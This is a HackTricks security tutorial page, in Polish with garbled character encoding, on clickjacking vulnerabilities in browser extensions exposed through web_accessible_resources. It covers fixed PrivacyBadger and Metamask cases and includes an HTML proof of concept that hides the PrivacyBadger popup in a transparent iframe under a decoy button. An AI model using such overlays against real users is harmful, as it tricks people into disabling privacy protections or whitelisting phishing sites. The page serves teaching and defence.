# BrowExt - ClickJacking

<details>

<summary><strong>Naucz siÄ™ hakowaÄ‡ AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* JeÅ›li chcesz zobaczyÄ‡ swojÄ… **firmÄ™ reklamowanÄ… w HackTricks** lub **pobraÄ‡ HackTricks w formacie PDF**, sprawdÅº [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* ZdobÄ…dÅº [**oficjalne gadÅ¼ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**RodzinÄ™ PEASS**](https://opensea.io/collection/the-peass-family), naszÄ… kolekcjÄ™ ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel siÄ™ swoimi sztuczkami hakerskimi, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## Podstawowe informacje

Ta strona wykorzystuje podatnoÅ›Ä‡ ClickJacking w rozszerzeniu przeglÄ…darki.\
JeÅ›li nie wiesz, czym jest ClickJacking, sprawdÅº:

{% content-ref url="../clickjacking.md" %}
[clickjacking.md](../clickjacking.md)
{% endcontent-ref %}

Rozszerzenia zawierajÄ… plik **`manifest.json`**, a ten plik JSON ma pole `web_accessible_resources`. Oto, co [dokumentacja Chrome'a](https://developer.chrome.com/extensions/manifest/web\_accessible\_resources) na ten temat mÃ³wi:

> Te zasoby bÄ™dÄ… dostÄ™pne na stronie internetowej za pomocÄ… adresu URL **`chrome-extension://[PACKAGE ID]/[PATH]`**, ktÃ³ry moÅ¼na wygenerowaÄ‡ za pomocÄ… metody **`extension.getURL`**. Zasoby na liÅ›cie dozwolonych sÄ… serwowane z odpowiednimi nagÅ‚Ã³wkami CORS, dziÄ™ki czemu sÄ… dostÄ™pne za pomocÄ… mechanizmÃ³w takich jak XHR.[1](https://blog.lizzie.io/clickjacking-privacy-badger.html#fn.1)

Zasoby **`web_accessible_resources`** w rozszerzeniu przeglÄ…darki nie sÄ… dostÄ™pne tylko przez sieÄ‡; dziaÅ‚ajÄ… rÃ³wnieÅ¼ z przywilejami inherentnymi dla rozszerzenia. Oznacza to, Å¼e majÄ… zdolnoÅ›Ä‡ do:

- Zmiany stanu rozszerzenia
- Åadowania dodatkowych zasobÃ³w
- Interakcji z przeglÄ…darkÄ… w pewnym stopniu

Jednak ta funkcja niesie ze sobÄ… ryzyko bezpieczeÅ„stwa. JeÅ›li zasÃ³b znajdujÄ…cy siÄ™ w **`web_accessible_resources`** ma jakÄ…kolwiek istotnÄ… funkcjonalnoÅ›Ä‡, atakujÄ…cy moÅ¼e potencjalnie osadziÄ‡ ten zasÃ³b w zewnÄ™trznej stronie internetowej. NieÅ›wiadomi uÅ¼ytkownicy odwiedzajÄ…cy tÄ™ stronÄ™ mogÄ… niechcÄ…cy aktywowaÄ‡ ten osadzony zasÃ³b. Takie aktywacje mogÄ… prowadziÄ‡ do niezamierzonych konsekwencji, w zaleÅ¼noÅ›ci od uprawnieÅ„ i moÅ¼liwoÅ›ci zasobÃ³w rozszerzenia.

## PrzykÅ‚ad PrivacyBadger

W rozszerzeniu PrivacyBadger zidentyfikowano podatnoÅ›Ä‡ zwiÄ…zana z deklaracjÄ… katalogu `skin/` jako `web_accessible_resources` w nastÄ™pujÄ…cy sposÃ³b (sprawdÅº oryginalny [post na blogu](https://blog.lizzie.io/clickjacking-privacy-badger.html)):
```json
"web_accessible_resources": [
"skin/*",
"icons/*"
]
```
Ta konfiguracja doprowadziÅ‚a do potencjalnego problemu zabezpieczeÅ„. Konkretnie plik `skin/popup.html`, ktÃ³ry jest renderowany po interakcji z ikonÄ… PrivacyBadger w przeglÄ…darce, mÃ³gÅ‚ byÄ‡ osadzony wewnÄ…trz elementu `iframe`. To osadzenie mogÅ‚o zostaÄ‡ wykorzystane do wprowadzenia uÅ¼ytkownikÃ³w w bÅ‚Ä…d i nieÅ›wiadomego klikniÄ™cia na "WyÅ‚Ä…cz PrivacyBadger dla tej witryny". Takie dziaÅ‚anie naruszaÅ‚oby prywatnoÅ›Ä‡ uÅ¼ytkownika poprzez wyÅ‚Ä…czenie ochrony PrivacyBadger i potencjalnie naraÅ¼enie uÅ¼ytkownika na zwiÄ™kszone Å›ledzenie. Wizualna demonstracja tego ataku moÅ¼e byÄ‡ obejrzana w przykÅ‚adzie wideo ClickJacking dostÄ™pnym pod adresem [**https://blog.lizzie.io/clickjacking-privacy-badger/badger-fade.webm**](https://blog.lizzie.io/clickjacking-privacy-badger/badger-fade.webm).

Aby rozwiÄ…zaÄ‡ tÄ™ podatnoÅ›Ä‡, zastosowano prosty sposÃ³b: usuniÄ™cie `/skin/*` z listy `web_accessible_resources`. Ta zmiana skutecznie ograniczyÅ‚a ryzyko, zapewniajÄ…c, Å¼e zawartoÅ›Ä‡ katalogu `skin/` nie moÅ¼e byÄ‡ dostÄ™pna ani manipulowana za pomocÄ… zasobÃ³w dostÄ™pnych przez sieÄ‡.

Naprawa byÅ‚a prosta: **usuÅ„ `/skin/*` z `web_accessible_resources`**.

### PoC
```html
<!--https://blog.lizzie.io/clickjacking-privacy-badger.html-->

<style>
iframe {
width: 430px;
height: 300px;
opacity: 0.01;
float: top;
position: absolute;
}

#stuff {
float: top;
position: absolute;
}

button {
float: top;
position: absolute;
top: 168px;
left: 100px;
}

</style>

<div id="stuff">
<h1>
Click the button
</h1>
<button id="button">
click me
</button>
</div>

<iframe src="chrome-extension://ablpimhddhnaldgkfbpafchflffallca/skin/popup.html">
</iframe>
```
## PrzykÅ‚ad Metamask

[**ArtykuÅ‚ na blogu o podatnoÅ›ci ClickJacking w Metamask moÅ¼na znaleÅºÄ‡ tutaj**](https://slowmist.medium.com/metamask-clickjacking-vulnerability-analysis-f3e7c22ff4d9). W tym przypadku Metamask naprawiÅ‚ podatnoÅ›Ä‡, sprawdzajÄ…c, czy protokÃ³Å‚ uÅ¼ywany do dostÄ™pu do niego to **`https:`** lub **`http:`** (a nie na przykÅ‚ad **`chrome:`**):

<figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

**Inna naprawiona podatnoÅ›Ä‡ ClickJacking** w rozszerzeniu Metamask polegaÅ‚a na tym, Å¼e uÅ¼ytkownicy mogli **kliknÄ…Ä‡, aby dodaÄ‡ do biaÅ‚ej listy**, gdy strona byÅ‚a podejrzana o phishing z powodu `â€œweb_accessible_resourcesâ€: [â€œinpage.jsâ€, â€œphishing.htmlâ€]`. PoniewaÅ¼ ta strona byÅ‚a podatna na Clickjacking, atakujÄ…cy mÃ³gÅ‚ jÄ… wykorzystaÄ‡, pokazujÄ…c coÅ› normalnego, aby zmusiÄ‡ ofiarÄ™ do klikniÄ™cia, aby dodaÄ‡ jÄ… do biaÅ‚ej listy, nie zauwaÅ¼ajÄ…c, Å¼e nastÄ™pnie wraca do strony phishingowej, ktÃ³ra zostanie dodana do biaÅ‚ej listy.

## PrzykÅ‚ad Steam Inventory Helper

SprawdÅº nastÄ™pujÄ…cÄ… stronÄ™, aby zobaczyÄ‡, jak **XSS** w rozszerzeniu przeglÄ…darki zostaÅ‚o poÅ‚Ä…czone z podatnoÅ›ciÄ… **ClickJacking**:

{% content-ref url="browext-xss-example.md" %}
[browext-xss-example.md](browext-xss-example.md)
{% endcontent-ref %}

## OdwoÅ‚ania

* [https://blog.lizzie.io/clickjacking-privacy-badger.html](https://blog.lizzie.io/clickjacking-privacy-badger.html)
* [https://slowmist.medium.com/metamask-clickjacking-vulnerability-analysis-f3e7c22ff4d9](https://slowmist.medium.com/metamask-clickjacking-vulnerability-analysis-f3e7c22ff4d9)

<details>

<summary><strong>Naucz siÄ™ hakowaÄ‡ AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* JeÅ›li chcesz zobaczyÄ‡ swojÄ… **firmÄ™ reklamowanÄ… w HackTricks** lub **pobraÄ‡ HackTricks w formacie PDF**, sprawdÅº [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* ZdobÄ…dÅº [**oficjalne gadÅ¼ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**RodzinÄ™ PEASS**](https://opensea.io/collection/the-peass-family), naszÄ… kolekcjÄ™ ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel siÄ™ swoimi sztuczkami hakerskimi, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
